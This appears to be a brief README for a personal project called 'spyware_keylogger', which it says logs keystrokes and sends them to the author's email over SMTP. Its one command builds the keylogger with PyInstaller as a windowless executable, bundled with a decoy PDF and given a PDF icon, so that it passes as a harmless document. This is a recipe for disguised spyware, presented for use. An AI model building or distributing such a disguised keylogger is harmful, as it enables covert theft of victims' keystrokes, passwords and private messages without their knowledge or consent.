# spyware_keylogger
Runs an .exe keylogger and logs data to my email using SMTP.

## Create .exe
 pyinstaller --onefile --noconsole --add-data="C:\Users\justi\Documents\Career\Projects\Key Logger\data_files\my_new_dog.pdf;data_files" --icon "C:\Users\justi\Documents\Career\Projects\Key Logger\data_files\pdf.ico" keylogger.py
